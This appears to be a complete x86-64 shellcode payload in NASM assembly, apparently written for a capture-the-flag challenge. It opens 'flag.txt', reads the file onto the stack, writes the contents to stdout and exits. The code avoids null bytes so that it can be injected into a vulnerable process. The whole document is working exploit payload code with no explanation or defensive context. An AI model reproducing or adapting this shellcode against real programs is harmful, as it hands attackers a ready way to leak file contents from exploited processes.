BITS 64
global _start

_start:

filename:
    xor esi, esi
    mul esi

    push rdx    ; '\0'

    mov rcx, 0x7478742e67616c66  ; 'flag.txt'
    push rcx

openfile:
    push rsp
    pop rdi

    mov al, 0x5
    sub al, 0x3
    syscall

readfile:
    push rax
    pop rdi
    
    push rsp
    pop rsi
    
    push rdx
    push rdx        ; saving lots of 0's
    push rdx
    push rdx
    pop rax
    mov dx, 0x999
    syscall

write:
    pop rdi
    inc edi
    
    push rax
    pop rdx
    pop rax
    inc eax
    syscall

leave:
    pop rax
    mov al, 60
    syscall